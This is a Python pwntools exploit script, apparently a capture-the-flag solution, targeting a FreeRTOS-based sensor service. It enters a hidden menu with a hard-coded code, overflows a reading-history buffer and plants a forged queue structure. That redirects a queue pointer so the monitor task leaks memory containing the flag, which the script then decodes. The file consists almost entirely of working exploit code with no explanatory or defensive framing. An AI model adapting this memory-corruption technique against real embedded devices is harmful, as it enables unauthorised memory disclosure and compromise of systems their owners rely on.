import struct
import dataclasses
from pwn import *
import time
import tqdm
import re

HOST = "localhost"
PORT = 1337

@dataclasses.dataclass
class QueueDefinition:
    pcHead: int = dataclasses.field(metadata=dict(fmt="<I")) # int8_t * pcHead
    pcWriteTo: int = dataclasses.field(metadata=dict(fmt="<I")) # int8_t * pcWriteTo
    # QueuePointers_t xQueue
    pcTail: int = dataclasses.field(metadata=dict(fmt="<I")) # int8_t * pcTail
    pcReadFrom: int = dataclasses.field(metadata=dict(fmt="<I"))# int8_t * pcReadFrom
    xTasksWaitingToSend: bytes # b"\x00"*0x14 # struct xLIST xTasksWaitingToSend
    xTasksWaitingToReceive: bytes # b"\x00"*0x14 # struct xLIST xTasksWaitingToReceive
    uxMessagesWaiting: int = dataclasses.field(metadata=dict(fmt="<I")) # uint32_t volatile uxMessagesWaiting
    uxLength: int = dataclasses.field(metadata=dict(fmt="<I")) # uint32_t uxLength
    uxItemSize: int = dataclasses.field(metadata=dict(fmt="<I")) # uint32_t uxItemSize


def to_bytes(qd: QueueDefinition) -> bytes:
    data = b""
    for field in dataclasses.fields(qd):
        if "fmt" in field.metadata:
            data += struct.pack(field.metadata["fmt"], getattr(qd, field.name))
        else:
            value = getattr(qd, field.name)
            assert isinstance(value, bytes)
            data += value

    return data

FLAG_PTR = 0x22d8
OFFSET_DOESNT_MATTER = 0x1000
READING_HISTORY = 0x20006140

io = remote(HOST, PORT)

qd = QueueDefinition(
    pcHead=0, # dont care
    pcWriteTo=0, # dont care
    pcTail=FLAG_PTR+OFFSET_DOESNT_MATTER,
    pcReadFrom=FLAG_PTR -4, 
    xTasksWaitingToSend=b"\x00" * 0x14, # dont care
    xTasksWaitingToReceive=b"\x00" * 0x14, # dont care
    uxMessagesWaiting = 0x100, # Just needs to be big enough to read the flag in 4 byte increments 
    uxLength=OFFSET_DOESNT_MATTER, # dont care
    uxItemSize=4 # Code writes to a uint32_t, so the max we can read via vMonitorTask() is that
)

# Condition thats checked in prvCopyDataFromQueue()
# Not required, but doing so avoids a code block that needs more values to be set in this struct
# and its not a hard constraint to fufill
assert qd.pcReadFrom < qd.pcTail

# xQueueReceive wont read from the queue if uxMessagesWaiting is 0
# uxMessagesWaiting is also decremented by 1 each read
assert qd.uxMessagesWaiting > 0

time.sleep(1)

# access secret menu
print("Sending secret code: charlotte")
io.sendline(b"charlotte")
time.sleep(1)

# stop the sensor task
print("Disabling sensor task")
io.sendline(b"s")
time.sleep(1)

output = io.recvrepeat(timeout=3).decode()
print(output)
sensor_pat = r"\[Sensor\] Reading = \d+"
sensor_count = len(re.findall(sensor_pat, output))
print(f"Sensor readings received: {sensor_count}")

fake_queue_ptr = READING_HISTORY + (sensor_count * 4)

# send payload
payload = to_bytes(qd)
for i in tqdm.tqdm(range(0, len(payload), 4)):
    chunk = payload[i:i+4]
    io.sendline(b"i")
    io.sendline(str(struct.unpack("<I", chunk)[0]).encode())
    time.sleep(.05) # Sleep to give the schduling a chance to actual consume input

# padding
for i in tqdm.tqdm(range(128 - sensor_count - (len(payload)//4))):
    io.sendline(b"i")
    io.sendline(f"{i}".encode())
    time.sleep(.05)

io.sendline(b"i")
io.sendline(str(fake_queue_ptr).encode())

# Dump all the stuff we recv'ed
output = io.recvrepeat(timeout=1).decode()

# Parse/Filter out the output to find our flag in the leaked memory
marker = f"[ALERT] Threshold exceeded! Reading = {fake_queue_ptr} > 75"
leak = output.split(marker)[1].strip().split("\r\n")
leak_pat = r"(\d+) (>|<=) 75"

leaks = b"".join([
    bytes.fromhex(format(int(re.search(leak_pat, l).group(1)), "08x"))[::-1] 
    for l in leak
])
print(leaks.decode('latin-1'))
